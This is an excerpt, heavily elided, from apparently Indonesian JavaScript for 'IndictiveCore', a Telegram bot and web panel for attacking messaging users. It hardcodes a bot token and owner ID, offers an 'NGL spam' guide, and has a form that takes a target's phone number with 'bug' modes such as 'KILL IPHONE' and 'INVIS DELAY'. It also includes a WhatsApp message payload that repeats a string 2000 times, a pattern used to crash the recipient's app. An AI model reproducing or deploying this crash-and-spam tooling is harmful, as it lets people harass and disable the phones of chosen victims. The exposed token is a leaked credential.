...
// ==================== CONFIGURATION ==================== //
const BOT_TOKEN = "8441631242:AAG7hJiQ7stmSuY2aTQJoGwfApMd3A5MKKE";
const OWNER_ID = "7446889039";
...
bot.command('start', async (ctx) => {
    try {
        const ambilFoto = "https://files.catbox.moe/hp9lf1.jpg";
        
        await ctx.replyWithPhoto(ambilFoto, {
            caption: `
⫹⫺ <a href="https://t.me/AiiSigma">𝐃𝐢𝐜𝐭𝐢𝐯𝐞 ☇ 𝐂𝐨𝐫𝐞°𝐒𝐲𝐬𝐭𝐞𝐦𝐬</a>
⏣ Creator : @ajisantos
⏣ Version : 2.0
⏣ League : Asia⧸Bandung
...
AUTHOR      : AiiSigma
TELEGRAM    : https://t.me/ajisantos
CHANEL      : https://t.me/hhhj
─────────────────────────────────────\n\n`));
...
<head>
  ...
  <title>IndictiveCore - Dashboard</title>
...
<body>
  ...
  <div class="sidebar" id="sidebar">
    <div class="sidebar-header">
      ...
      <div class="app-title">IndictiveCore</div>
    ...
    <ul class="nav-menu">
      ...
      <li class="nav-item"><a href="https://te.me/AiiSigma" class="nav-link"><i class="fab fa-telegram"></i>Telegram</a></li>
  ...
  <div class="main-content">
    ...
    <video class="banner-video" autoplay muted loop playsinline preload="auto" 
        poster="https://i.top4top.io/p_3590b6bk90.jpg"
  ...
  <source src="https://assets.codepen.io/3364143/710.mp4" type="video/mp4">
      ...
      <div class="banner-content">
        <div class="banner-title">DictiveCore</div>
...
app.get("/ngl-spam/guide", requireAuth, (req, res) => {
  ...
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Panduan NGL Spam - IndictiveCore</title>
      <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
      <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
      <style>
        :root {
    ...
    <div class="container">
      ...
      <div class="server-banner">
        <video class="banner-video" autoplay muted loop playsinline>
          <source src="https://l.top4top.io/m_35907o1o00.mp4" type="video/mp4">
          Your browser does not support the video tag.
        </video>
        <div class="banner-content">
          <div class="banner-title">IndictiveCore</div>
          <div class="banner-time">
            <i class="fas fa-clock"></i>
            <span id="currentTime">Loading...</span>
          </div>
          ...
          buttonsMessage: {
            ...
            contextInfo: {
              ...
              externalAdReply: {
                ...
                sourceUrl: `https://t.me/${"عليكم".repeat(2000)}AiiSigma`,
              },
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/AiiSigma",
                    unconsentedUsersUrl: "https://t.me/AiiSigma",
                    consentedUsersUrl: "https://t.me/AiiSigma",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/AiiSigma",
  ...
  <div class="main-content">
    ...
    <div class="form-section">
      ...
      <div class="bug-selector-container">
        ...
        <div class="bug-options-container" id="bugOptionsContainer">
          <button class="bug-option-btn" data-mode="andros">ANDROID X UI</button>
          <button class="bug-option-btn" data-mode="andros-delay">INVIS DELAY</button>
          <button class="bug-option-btn" data-mode="ios">KILL IPHONE</button>
          <button class="bug-option-btn" data-mode="invis-iphone">INVIS IOS</button>
        </div>
        
        <!-- Terminal-style display dengan font coding dan READY -->
        <div class="selected-bug-display" id="selectedBugDisplay">
          <div class="terminal-line">
            <span class="terminal-prompt">user@dictivecore:~$</span>
    ...
    <div class="info-section">
      ...
      <div class="info-content">
        ...
        <ul>
          <li><span class="highlight">Nomor Target</span>: Masukkan nomor telepon target dengan format internasional (contoh: 6281234567890)</li>
    ...
    <div class="info-section">
      ...
      <div class="info-content">
        ...
        <p>DictiveCore menggunakan protokol keamanan tingkat tinggi untuk melindungi identitas dan data pengguna:</p>
